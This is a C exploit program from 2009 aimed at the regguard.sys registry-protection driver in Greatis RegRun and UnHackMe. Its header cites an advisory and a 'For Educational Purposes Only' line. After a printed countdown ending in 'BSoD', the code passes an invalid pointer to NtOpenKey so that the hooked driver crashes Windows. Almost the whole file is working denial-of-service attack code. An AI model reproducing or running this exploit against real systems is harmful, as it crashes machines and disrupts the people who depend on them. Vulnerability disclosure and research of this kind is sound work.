////////////////////////////////////////////////////////////////////////////////////
// +----------------------------------------------------------------------------+ //
// |                                                                            | //
// | Greatis Software - http://www.greatis.com/                                 | //
// |                                                                            | //
// | Affected Software:                                                         | //
// | RegRun Reanimator <= 6.0.6.50                                              | //
// | RegRun Security Suite Version <= 6.00                                      | //
// | UnHackMe <= 5.5 beta                                                       | //
// |                                                                            | //
// | Affected Driver:                                                           | //
// | Registry Guard - registry keys protection driver for                       | //
// | Windows NT/2000/XP/2003/Vista - regguard.sys <= 4.0.6.0                    | //
// |                                                                            | //
// | Local Denial of Service Exploit - NtOpenKey (SDT HOOK)                     | //
// | For Educational Purposes Only !                                            | //
// |                                                                            | //
// +----------------------------------------------------------------------------+ //
// |                                                                            | //
// | NT Internals - http://www.ntinternals.org/                                 | //
// | alex ntinternals org                                                       | //
// | 04 September 2009                                                          | //
// |                                                                            | //
// | References:                                                                | //
// | RegRun & UnHackMe Multiple Vulnerabilities                                 | //
// | http://www.ntinternals.org/ntiadv0811/ntiadv0811.html                      | //
// |                                                                            | //
// +----------------------------------------------------------------------------+ //
////////////////////////////////////////////////////////////////////////////////////

#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include "RegGuard_DoS_02.h"


int __cdecl main(int argc, char **argv)
{
    NTSTATUS NtStatus;
    
    HANDLE KeyHandle;
    
    LARGE_INTEGER Interval;

    ///////////////////////////////////////////////////////////////////////////////////////////////

    system("cls");

    printf(" +----------------------------------------------------------------------------+\n"
           " |                                                                            |\n"
           " | Greatis Software - http://www.greatis.com/                                 |\n"
           " |                                                                            |\n"
           " | Affected Software:                                                         |\n"
           " | RegRun Reanimator <= 6.0.6.50                                              |\n"
           " | RegRun Security Suite Version <= 6.00                                      |\n"
           " | UnHackMe <= 5.5 beta                                                       |\n"
           " |                                                                            |\n"
           " | Affected Driver:                                                           |\n"
           " | Registry Guard - registry keys protection driver for                       |\n"
           " | Windows NT/2000/XP/2003/Vista - regguard.sys <= 4.0.6.0                    |\n"
           " |                                                                            |\n"
           " | Local Denial of Service Exploit - NtOpenKey (SDT HOOK)                     |\n"
           " | For Educational Purposes Only !                                            |\n"
           " |                                                                            |\n"
           " +----------------------------------------------------------------------------+\n"
           " |                                                                            |\n"
           " | NT Internals - http://www.ntinternals.org/                                 |\n"
           " | alex ntinternals org                                                       |\n"
           " | 04 September 2009                                                          |\n"
           " |                                                                            |\n"
           " | References:                                                                |\n"
           " | RegRun & UnHackMe Multiple Vulnerabilities                                 |\n"
           " | http://www.ntinternals.org/ntiadv0811/ntiadv0811.html                      |\n"
           " |                                                                            |\n"
           " +----------------------------------------------------------------------------+\n\n");

    ///////////////////////////////////////////////////////////////////////////////////////////////

    Interval.LowPart = 0xFF676980;
    Interval.HighPart = 0xFFFFFFFF;

    printf("\n 3");
    NtDelayExecution(FALSE, &Interval);

    printf(" 2");
    NtDelayExecution(FALSE, &Interval);

    printf(" 1");
    NtDelayExecution(FALSE, &Interval);

    printf(" BSoD\n\n");
    NtDelayExecution(FALSE, &Interval);

    
    NtStatus = NtOpenKey(
                         &KeyHandle,         // KeyHandle
                         KEY_ALL_ACCESS,     // DesiredAccess
                         (PVOID)0xDEADC0DE); // ObjectAttributes

    if(NtStatus)
    {
        printf(" [*] NtStatus of NtOpenKey - 0x%.8X\n", NtStatus);    
        return NtStatus;
    }

    return FALSE;
}